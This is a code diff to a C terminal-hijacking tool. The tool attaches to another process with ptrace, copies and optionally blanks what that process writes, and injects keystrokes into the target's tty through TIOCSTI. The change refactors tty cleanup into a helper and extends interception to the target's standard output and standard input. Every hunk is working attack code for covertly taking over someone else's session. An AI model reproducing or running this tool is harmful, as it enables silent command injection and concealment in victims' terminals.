@@ -27,16 +27,21 @@ int hidden_flag = 0;
 int hide_counter = 0;
 int auto_hide = 1;
 
+void reset_tty_and_exit(int status)
+{
+    /* restore original tty settings */
+    tcsetattr(STDIN_FILENO, TCSANOW, &prev);
+    printf("\n");
+    exit(status);
+}
+
 void die(const char* format, ...)
 {
     va_list argptr;
     va_start(argptr, format);
     vfprintf(stderr, format, argptr);
     va_end(argptr);
-    /* restore original tty settings */
-    tcsetattr(STDIN_FILENO, TCSANOW, &prev);
-    printf("\n");
-    exit(1);
+    reset_tty_and_exit(1);
 }
 
 void set_hidden()
@@ -98,10 +103,7 @@ void check_window_size()
 /* sigterm handler */
 void term(int signum)
 {
-    /* restore original tty settings */
-    tcsetattr(STDIN_FILENO, TCSANOW, &prev);
-    printf("\n");
-    exit(0);
+    reset_tty_and_exit(0);
 }
 
 /* make sure our tty is still large enough for the one we're hijacking */
@@ -155,10 +157,10 @@ void* mirror_output(void *unused)
     ptrace(PTRACE_ATTACH, pid, 0, 0);
     wait(0);
 
-    while(1) {
+    while (1) {
         ptrace(PTRACE_SYSCALL, pid, 0, 0);
         wait(&status);
-        if(WIFEXITED(status))
+        if (WIFEXITED(status))
             break;
 
         struct user_regs_struct regs;
@@ -168,11 +170,11 @@ void* mirror_output(void *unused)
          * buf:  regs.rsi
          * size: regs.rdx
          */
-        if(regs.orig_rax == SYS_write && regs.rdi == write_fd) {
+        if (regs.orig_rax == SYS_write && (regs.rdi == write_fd || regs.rdi == 1)) {
             int i;
             char *buf = malloc(regs.rdx + sizeof(long));
 
-            for(i = 0; i < regs.rdx; i += sizeof(long)) {
+            for (i = 0; i < regs.rdx; i += sizeof(long)) {
                 long val = ptrace(PTRACE_PEEKDATA, pid, regs.rsi + i, 0);
                 memcpy(buf + i, &val, sizeof(long));
             }
@@ -181,23 +183,24 @@ void* mirror_output(void *unused)
             free(buf);
 
             /* discard writes if hidden_flag is set */
-            if(is_hidden()) {
+            if (is_hidden()) {
                 memset(buf, 0, regs.rdx);
-                for(i = 0; i < regs.rdx; i += sizeof(long))
+                for (i = 0; i < regs.rdx; i += sizeof(long))
                     ptrace(PTRACE_POKEDATA, pid, regs.rsi + i, *(long *)(buf + i));
             }
-        } else if(regs.orig_rax == SYS_read && regs.rdi == read_fd && is_hide_counter_zero()) {
-            unset_hidden();
         }
 
         /* return of the syscall */
         ptrace(PTRACE_SYSCALL, pid, 0, 0);
         wait(&status);
-        if(WIFEXITED(status))
+        if (WIFEXITED(status))
             break;
-        if(regs.orig_rax == SYS_read && regs.rdi == read_fd) {
+        if (regs.orig_rax == SYS_read && (regs.rdi == read_fd || regs.rdi == 0)) {
+            if (is_hide_counter_zero())
+                unset_hidden();
+
             ptrace(PTRACE_GETREGS, pid, 0, &regs);
-            if(regs.rax >= 0)
+            if (regs.rax >= 0)
                 subtract_hide_counter(regs.rax);
         }
     }
@@ -239,11 +242,11 @@ int main(int argc, char **argv)
     set_hidden();
     increment_hide_counter();
     ioctl(target_tty_fd, TIOCSTI, &c);
-    while(1) {
+    while (1) {
         c = getchar();
 
         /* ctrl-A */
-        if(c == 0x01) {
+        if (c == 0x01) {
             c = getchar();
             if (c == 'd')
                 break;
@@ -274,8 +277,5 @@ int main(int argc, char **argv)
     pthread_cancel(output_thread);
     pthread_join(output_thread, NULL);
 
-    /* restore original tty settings */
-    tcsetattr(STDIN_FILENO, TCSANOW, &prev);
-    printf("\n");
-    return 0;
+    reset_tty_and_exit(0);
 }
